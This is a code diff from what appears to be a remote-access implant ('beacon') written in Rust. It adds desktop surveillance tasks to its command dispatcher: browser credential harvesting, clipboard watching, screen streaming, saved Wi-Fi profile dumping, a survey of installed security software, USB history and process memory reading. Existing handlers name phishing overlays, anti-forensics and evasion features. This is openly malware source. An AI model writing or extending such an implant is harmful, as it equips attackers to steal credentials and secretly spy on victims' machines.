@@ -56,14 +56,21 @@ pub struct Outcome {
     /// the RESULT body, so the server and the operator can see transfer metadata
     /// without changing the message shape.
     pub extra: Vec<(&'static str, Value)>,
+    /// The chunks of a streamed answer.
+    ///
+    /// A picture of the screen is bigger than a frame of the protocol, and a
+    /// stream of them is bigger still.  The beacon sends every chunk as a
+    /// partial result -- the task stays open while the chunks travel -- and
+    /// the final result closes it.
+    pub chunks: Vec<Vec<u8>>,
 }
 
 impl Outcome {
     pub fn ok(out: Vec<u8>) -> Self {
-        Outcome { code: 0, out, err: String::new(), extra: Vec::new() }
+        Outcome { code: 0, out, err: String::new(), extra: Vec::new(), chunks: Vec::new() }
     }
     pub fn err(code: i64, msg: impl Into<String>) -> Self {
-        Outcome { code, out: Vec::new(), err: msg.into(), extra: Vec::new() }
+        Outcome { code, out: Vec::new(), err: msg.into(), extra: Vec::new(), chunks: Vec::new() }
     }
     /// Attach a metadata field to the result.
     pub fn with(mut self, key: &'static str, value: Value) -> Self {
@@ -239,11 +246,12 @@ pub fn shell(cmd: &str, timeout_secs: u64) -> Outcome {
             out: truncate(out),
             err: format!("command timed out after {limit}s"),
             extra: Vec::new(),
+            chunks: Vec::new(),
         };
     }
 
     let code = child.wait().ok().and_then(|s| s.code()).map(|c| c as i64).unwrap_or(0);
-    Outcome { code, out: truncate(out), err: String::new(), extra: Vec::new() }
+    Outcome { code, out: truncate(out), err: String::new(), extra: Vec::new(), chunks: Vec::new() }
 }
 
 /// Read one chunk of a file.
@@ -781,7 +789,11 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
         // desktop has no radio, no camera and no address book, and it
         // says so instead of pretending that nothing happened.
         "gps.locate" | "wifi.dump" | "bluetooth.scan" | "contacts.dump" => {
-            Outcome::err(2, "the senses of the phone need the phone implant")
+            Outcome::err(
+                2,
+                "the senses of the phone need the phone implant; the saved networks of the \
+                 desktop are wifi.profiles",
+            )
         }
         "sms.dump" | "call.logs" | "emulator.detect" => {
             Outcome::err(2, "the senses of the phone need the phone implant")
@@ -801,6 +813,59 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
         "phish.overlay" | "app.dump" | "anti.forensic" | "evade.suicide" => {
             Outcome::err(2, "the phone implant does this on a phone")
         }
+        // The senses of the desktop: the window table, the clipboard, the
+        // screen in motion, the wireless networks, the browsers, the
+        // security software, the USB keys and the memory of a process.
+        "window.list" => match crate::senses::window_list() {
+            Ok(text) => Outcome::ok(text.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+        "clipboard.watch" => match crate::senses::clipboard_watch(
+            &args.str_or("action", "status"),
+            args.u64_or("interval_ms", 1000),
+        ) {
+            Ok(text) => Outcome::ok(text.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+        "screen.stream" => match crate::senses::screen_stream(
+            args.u64_or("frames", 5) as usize,
+            args.u64_or("fps", 1) as u32,
+        ) {
+            Ok(frames) => {
+                let total = frames.len() as u64;
+                let mut outcome = Outcome::ok(format!("screen.stream: {total} frames\n").into_bytes());
+                outcome.chunks = frames;
+                outcome.with("frames", upk::u(total))
+            }
+            Err(e) => Outcome::err(1, e),
+        },
+        "wifi.profiles" => match crate::senses::wifi_profiles() {
+            Ok(text) => Outcome::ok(text.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+        "browser.creds" => match crate::senses::browser_creds() {
+            Ok((text, entries)) => {
+                let raw = args.bool_or("raw", false);
+                let values: Vec<Value> = entries.iter().map(|entry| entry.to_value(raw)).collect();
+                let total = entries.len() as u64;
+                Outcome::ok(text.into_bytes())
+                    .with("creds", upk::arr(values))
+                    .with("creds_total", upk::u(total))
+            }
+            Err(e) => Outcome::err(1, e),
+        },
+        "av.survey" => match crate::senses::av_survey() {
+            Ok(text) => Outcome::ok(text.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+        "usb.history" => match crate::senses::usb_history() {
+            Ok(text) => Outcome::ok(text.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+        "proc.memory" => match crate::senses::proc_memory(args.u64_or("pid", 0) as u32) {
+            Ok(text) => Outcome::ok(text.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
         "hygiene.process" => match crate::hygiene::process(&args) {
             Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
             Err(e) => Outcome::err(1, e),
